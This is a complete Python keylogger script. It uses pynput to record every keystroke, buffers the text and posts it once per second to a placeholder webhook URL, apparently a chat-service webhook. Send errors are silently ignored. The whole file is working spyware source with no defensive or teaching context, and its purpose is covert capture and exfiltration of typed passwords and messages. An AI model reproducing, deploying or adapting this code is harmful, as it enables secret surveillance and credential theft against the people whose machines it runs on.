from pynput import keyboard
import requests
import threading
import time

webhook_url = "Your webhook"

buffer = []
lock = threading.Lock()

def format_key(key):
    try:
        return key.char
    except AttributeError:
        if key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.enter:
            return "[ENTER]\n"
        else:
            return f"[{key.name.upper()}]"

def send_loop():
    while True:
        time.sleep(1)  # co 1 sekundę
        with lock:
            if buffer:
                message = "".join(buffer)
                buffer.clear()
            else:
                continue

        try:
            requests.post(webhook_url, json={"content": message})
        except:
            pass

def on_press(key):
    k = format_key(key)
    with lock:
        buffer.append(k)


threading.Thread(target=send_loop, daemon=True).start()


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()